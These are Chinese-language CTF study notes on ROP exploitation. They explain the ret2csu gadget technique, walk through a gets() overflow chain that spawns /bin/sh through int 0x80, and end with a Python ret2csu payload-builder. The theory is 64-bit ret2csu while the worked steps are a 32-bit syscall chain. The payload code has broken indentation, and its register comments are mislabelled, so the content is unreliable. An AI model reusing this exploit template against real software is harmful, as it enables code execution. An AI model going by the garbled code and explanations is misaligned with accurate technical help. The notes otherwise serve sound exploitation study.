## 原理
1. 我们可以在我们的 `IDA` 中找到我们的 `libc_csu_init` 函数，这一类函数的特点是，存在有大量的 `pop` 指令，来修改我们的寄存器，我们就可以修改我们的 `rbx,rbp,rdx,rsi,edi`,
![[Pasted image 20231206221323.png]]
2. 因为我们的 `64` 位下，我们的指令参数前六个都是要从我们的寄存器中去获取，后续的其他参数从我们的栈中去获取。因此，我们可以直接用我们这一个来修改我们的寄存器。

但是，我们需要注意的是，我们需要提前定位好我们的数据的对应地址在哪里。

## 操作流程：
1. Checksec 我们的代码，检查哦我们的代码架构
![[Pasted image 20231129202327.png]]
因为写入了 `NX `，所以我们直接写 shellcode 是不可能的

2. 检查我们的程序中是否有后门函数
![[Pasted image 20231129202408.png]]

3. 我们发现，我们有 `\bin\sh` 字符产，但是没有我们的 `system` 函数，我们就考虑用我们的返回导向编程
![[Pasted image 20231129202524.png]]
4. 我们找到我们程序中的漏洞，比如说我们的 `gets`
![[Pasted image 20231129202604.png]]

5. 于是我们就先去找我们的对应的 `gadget`
![[Pasted image 20231129202708.png]]

6. 我们给我们的 `eax,ebx,ecx,edx` 赋值，又因为我们的 `ecx,edx` 初始为 0，所以我们优先考虑给我们的 `eax，ebx` 赋值。
最后，我们找到了下面的代码：
![[Pasted image 20231129202851.png]]
![[Pasted image 20231129203938.png]]
对于我们的 `pop_eax_ret`,这是我们首先要执行的地址，这就是我们 `栈溢出的地址`，
紧随其后，系统会执行我们的 `pop_eax`，把我们栈顶元素付给我们的 `eax`,所以我们下一个内容，就是我们的 ` eax ` 需要的数据，在这里是我们的 ` 0xb `,
再然后，系统会执行我们 `eax-return`, `return` 指令会把我们的给我们的指令指出我们的下一个地址应该是哪里，这里我们就需要填写我们的 ` pop_edx_ecx_ebx_return ` 的地址。
然后，我们的栈中还需要分别写我们的 `edx` 需要的内容，这里是我们的 0， `ecx`, `ebx` 需要的内容，注意到，我们的 `ebx`,需要填写我们的 `/bin/sh`,这里我们选择用我们的地址传参，也就是我们要在这里写入我们的地址, 最后，再输入我们的下一条要执行指令的地址，也就是我们的 ` int 80 `


## 利用方法：
```python
def ret2csu(padding, rbx, rbp, r12, r13, r14, r15, sign, ret_addr):  
       payload = padding  
    payload+= p64(gadgets1)     #gadget1  
          payload += 'b'*8                     
    payload+= p64(rbx)              #rbx  
    payload+= p64(rbp)              #rbp  
    payload+= p64(r12)              #r12 - 要使用的函数  
    if sign == 'asc':       #正序  
        payload+= p64(r13)      # rdx - 参数1  
        payload+= p64(r14)      # rsi - 参数2  
        payload+= p64(r15)       # edi - 参数3  
    elif sign == 'desc':    #逆序  
        payload+= p64(r15)       # rdi - 参数3  
        payload+= p64(r14)      # rsi - 参数2  
        payload+= p64(r13)      # rdx - 参数1  
    payload+= p64(gadgets2)     #gadget2  
      
    payload += 'c' * 0x38        #抬高7*8个字节   
    payload += p64(ret_addr) #及返回地址  
    r.sendline(payload)
```